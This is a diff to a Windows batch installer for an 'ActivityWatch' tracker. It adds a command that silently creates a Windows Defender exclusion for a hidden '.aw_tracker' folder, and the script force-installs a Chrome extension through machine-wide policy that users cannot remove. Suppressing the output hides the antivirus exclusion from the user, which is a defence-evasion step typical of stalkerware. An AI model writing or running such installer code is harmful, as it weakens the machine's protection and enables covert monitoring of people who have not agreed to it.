@@ -1,6 +1,10 @@
 @echo off
 echo Starting ActivityWatch Master Installation...
 
+:: Add Windows Defender Exclusion automatically (Requires Admin)
+echo Configuring Windows Defender...
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\.aw_tracker'" >nul 2>&1
+
 :: Windows Chrome Policy
 echo Setting up Chrome Extension...
 reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx" /f
